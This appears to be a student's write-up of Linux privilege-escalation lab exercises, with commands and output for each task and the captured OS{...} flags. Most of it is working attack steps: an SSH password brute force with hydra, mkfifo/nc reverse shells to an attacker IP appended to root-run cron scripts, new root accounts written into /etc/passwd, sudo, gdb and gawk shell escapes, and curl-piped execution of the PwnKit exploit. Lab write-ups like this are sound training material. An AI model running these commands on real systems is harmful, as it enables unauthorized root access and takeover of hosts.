# User Trails

2. Connect to the VM 2 machine with the provided credentials and try to get the flag that resides under another user's file.

```bash
# Enumerate users
cat /etc/passwd
	root:x:0:0:root:/root:/bin/bash
	...
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	...
	sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
	...
	joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
	systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
	eve:x:1001:1001:,,,:/home/eve:/bin/bash
	...

cat .bashrc
	# ~/.bashrc: executed by bash(1) for non-login shells.
	# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
	# for examples
	
	# If not running interactively, don't do anything
	case $- in
	    *i*) ;;
	      *) return;;
	esac
	
	# don't put duplicate lines or lines starting with space in the history.
	# See bash(1) for more options
	export SCRIPT_CREDENTIALS="lab"
	HISTCONTROL=ignoreboth
	...

# In attack machine create wordlist to attempt SSH brute force
crunch 6 6 -t Lab%%% > wordlist                                                 ## NOTE!!!!!!    <view below>
	Crunch will now generate the following amount of data: 7000 bytes
	0 MB
	0 GB
	0 TB
	0 PB
	Crunch will now generate the following number of lines: 1000

hydra ssh://192.168.231.214 -l eve -P wordlist
	...
	[DATA] attacking ssh://192.168.231.214:22/
	[22][ssh] host: 192.168.231.214   login: eve   password: Lab123
```
	- ## NOTE!!!!!!    For some reason, even though stored creds show a lowercase 'l', the password uses the uppercase.  Could be a course mats issue?

- Login as `eve` & retrieve flag
```bash
cat .bashrc
	  elif [ -f /etc/bash_completion ]; then
		. /etc/bash_completion
	  fi
	fi
	export PASSWORD=OS{d95b244a2df03c878ca3ca21b607901a}
```


# Service Footprints

2. Connect to VM 2 as the _joe_ user and retrieve the flag using one of the methods explained in this section.
```bash
watch -n 5 "ps -aux | grep OS{"
	Every 5.0s: ps -aux | grep OS{                                                                      debian-privesc: Wed May  1 14:49:01 2024
	
	root      1321  0.0  0.3  15328  6476 ?        S    14:47   0:00 python3 /root/.scripts/flag4.py OS{ecfa3948eb56a2bf37eff4bd96cfe866}
	joe       1554  0.0  0.1   6376  3324 pts/1    S+   14:48   0:00 watch -n 5 ps -aux | grep OS{
	joe       1593  0.0  0.0   6376   872 pts/1    S+   14:49   0:00 watch -n 5 ps -aux | grep OS{
	joe       1594  0.0  0.0   2384   696 pts/1    S+   14:49   0:00 sh -c ps -aux | grep OS{
	joe       1596  0.0  0.0   6072   820 pts/1    S+   14:49   0:00 grep OS{
```


# Insecure File Permissions

## Cron
2. Connect to VM 2 and look for another misconfigured cron job. Once found, exploit it and obtain a root shell in order to get a flag.
```bash
# Find insecure cron job
grep -i "cron" /var/log/syslog
	May  1 22:22:31 debian-privesc CRON[1318]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
	May  1 22:22:37 debian-privesc crontab[1338]: (root) LIST (root)
	May  1 22:22:37 debian-privesc crontab[1340]: (root) REPLACE (root)
	May  1 22:23:01 debian-privesc cron[505]: (root) RELOAD (crontabs/root)
	May  1 22:23:01 debian-privesc CRON[1368]: (root) CMD (/bin/bash /tmp/this_is_fine.sh)
	May  1 22:23:01 debian-privesc CRON[1369]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
	May  1 22:23:01 debian-privesc CRON[1367]: (CRON) info (No MTA installed, discarding output)

# Verify writeable
ls -l /tmp/this_is_fine.sh
	-rwxrwxrw- 1 root root 12 May  1 22:22 /tmp/this_is_fine.sh

# Add shell via named pipe
echo >> /tmp/this_is_fine.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.238 5555 >/tmp/f" >> /tmp/this_is_fine.sh

# Start nc listener on attacker vm & grab flag
nc -nlvp 5555
	listening on [any] 5555 ...
	connect to [192.168.45.238] from (UNKNOWN) [192.168.180.214] 52542
	/bin/sh: 0: can''t access tty; job control turned off
ls
	flag.txt
cat flag.txt
	OS{0e42cb3b8c8b22e3f79e1cf1c4e0f11e}
```


## Passwd Auth
Connect to VM 2 and get the flag by elevating to a root shell through password authentication abuse.
```bash
# Create hash
openssl passwd letsgo
	XDEq5.4QkkVVM

# Add user/ passwd
echo "rooot:XDEq5.4QkkVVM:0:0:root:/root:/bin/bash" >> /etc/passwd

# su to new user & grab flag
su rooot
	Password: 

whoami
	root

cd /root
ls
	flag.txt

cat flag.txt
	OS{86d5ee4209a4acf3b68489772581026d}
```


# Insecure System Components

## Setuid Capabilities
```bash
# Find binary with setuid capability enabled
/usr/sbin/getcap -r / 2>/dev/null | grep setuid
	/usr/bin/gdb = cap_setuid+ep
```

- Find exploit
![](gtfobins_gdbcapabilities.png)

```bash
# Abuse
/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
	GNU gdb (Debian 8.2.1-2+b3) 8.2.1
	Copyright (C) 2018 Free Software Foundation, Inc.
	...
	For help, type "help".
	Type "apropos word" to search for commands related to "word".
	# ls
		Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
	# find / -name flag.txt 2>/dev/null
		/root/flag.txt
	# cat /root/flag.txt
		OS{e534f504e872c3af83048a6676aec75c}
```


## Sudo

2. Connect to VM 2 and gain a root shell by abusing a _sudo_ misconfiguration.
```bash
# Get list of sudo cmds available
sudo -l
	[sudo] password for joe: 
	Matching Defaults entries for joe on debian-privesc:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
	
	User joe may run the following commands on debian-privesc:
	    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/gcc
```

- Research exploit from GTFObins
![](gtfobins_gccsudo.png)

- Abuse
```bash
sudo gcc -wrapper /bin/sh,-s .
	# id
		uid=0(root) gid=0(root) groups=0(root)
	# cat /root/flag.txt
		OS{dab4c20b044f5dfa647824f1ff181a2f}
```


## Kernel Vulns

2. **Capstone Exercise**: Connect to VM 2 with the provided credentials and gain a root shell by abusing a different kernel vulnerability.

Alright.. it's capstone, so let's try all the things
```bash
# Search for sudo abuse
sudo -l
	[sudo] password for joe: 
	Sorry, user joe may not run sudo on ubuntu-privesc.

# Search for setuid binaries or capabilities
/usr/sbin/getcap -r / 2>/dev/null
	#<no results>

find / -perm -u=s -type f 2>/dev/null
	/usr/lib/snapd/snap-confine
	/usr/lib/policykit-1/polkit-agent-helper-1
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
	/usr/lib/openssh/ssh-keysign
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/usr/bin/sudo
	/usr/bin/newuidmap
	/usr/bin/chsh
	/usr/bin/newgrp
	/usr/bin/gpasswd
	/usr/bin/passwd
	/usr/bin/newgidmap
	/usr/bin/chfn
	/usr/bin/at
	/usr/bin/pkexec
	/bin/su
	/bin/fusermount
	/bin/ping
	/bin/ntfs-3g
	/bin/mount
	/bin/umount
	/bin/ping6
```

- Did a bunch of research into all the binaries.  Lots of googling for 'binary privilege escalation'
- **pkexec** had a lot of hits - [CVE-2021-4034 PwnKit](https://ine.com/blog/exploiting-pwnkit-cve-20214034)
- Code from [Packet Storm](https://packetstormsecurity.com/files/165739/PolicyKit-1-0.105-31-Privilege-Escalation.html) wouldn't work because of a library's different version
- Trying a [self-contained exploit](https://github.com/ly4k/PwnKit)
```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
	root@ubuntu-privesc:/home/joe# id
		uid=0(root) gid=0(root) groups=0(root),1001(joe)
	root@ubuntu-privesc:/home/joe# cat /root/flag.txt
		OS{17f09f4a7a11c53548a96256cde7395a}
```


3. **Capstone Exercise**: Connect to the VM 3 with the provided credentials and use an appropriate privilege escalation technique to gain a root shell and read the flag.

```bash
# Check sudo access
sudo -l
	[sudo] password for student: 
	Sorry, user student may not run sudo on 7b0ba44e34ba.

crontab -l
	no crontab for student

ls /etc/cron*
	/etc/crontab
	
	/etc/cron.d:
	e2scrub_all
	
	/etc/cron.daily:
	apt-compat  dpkg  exim4-base  man-db
	
	/etc/cron.hourly:
	archiver
	
	/etc/cron.monthly:
	
	/etc/cron.weekly:
	man-db


# Check out archiver
cat /etc/cron.hourly/archiver 
	#!/bin/sh
	
	# I wanted this to run more often so moved to it to my personal crontab so I could run it every minute
	/var/archives/archive.sh


ls -l /var/archives/archive.sh                                                                                                          
	-rwxrwxrwx 1 root root 159 Nov 15  2021 /var/archives/archive.sh


cat /var/archives/archive.sh 
	#!/bin/bash
	
	TIMESTAMP=$(date +"%T")
	echo "$TIMESTAMP running the archiver"
	#cp -rf /home/kali/ /var/backups/kali/
	cp -rf /home/student/ /var/backups/student/


# Edit /var/archives/archive.sh to add in a reverse shell via named pipe
echo >> /var/archives/archive.sh
echo "rm /tmp/f;mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.238 5555 > /tmp/f" >> /var/archives/archive.sh

# nc listener on attack machine
nc -nlvp 5555
	listening on [any] 5555 ...
	connect to [192.168.45.238] from (UNKNOWN) [192.168.180.52] 42652
	/bin/sh: 0: can''t access tty; job control turned off
	# id
		uid=0(root) gid=0(root) groups=0(root)
	# cat /root/flag.txt
		OS{785acadbe08ed64be6c0f36639d6a223}
```



4. **Capstone Exercise**: On the Module Exercise VM 4, use another appropriate privilege escalation technique to gain access to root and read the flag. Take a closer look at file permissions.

```bash
# Check sudo perms
sudo -l
	Sorry, user student may not run sudo on 54c2616d3074.

#################################################
# No cron jobs, setuid binaries or capabilities #
#################################################

ls -l /etc/passwd
-rw-rw-rw- 1 root root 1370 May  2 21:50 /etc/passwd

# Add new root user
openssl passwd hell0
	8hV.undkvo6HU

echo "root2:8hV.undkvo6HU:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2
	Password: 

# cat /root/flag.txt
	OS{38ccf7e48021add8de461e3fbb1c37db}
```


5. **Capstone Exercise**: Again, use an appropriate privilege escalation technique to gain access to root and read the flag on the Module Exercise VM 5. Binary flags and custom shell are what to look for.

```bash
# Check for sudo privs
sudo -l
	-bash: sudo: command not found        # AMAAAAAZING

# Check setuid
find / -perm -u=s -type f 2>/dev/null
/bin/umount
/bin/su
/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/find
/usr/bin/chfn
/usr/bin/gawk
/usr/bin/vim.basic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

# https://gtfobins.github.io/gtfobins/gawk/#limited-suid
gawk 'BEGIN {system("/bin/sh")}'
# id
	uid=1000(student) gid=1000(student) euid=0(root) groups=1000(student)
# cat /root/flag.txt
	Great job! You found me.
	Here is your flag:
	
	OS{47d009055d871a63cc9eee6361d647b7}
```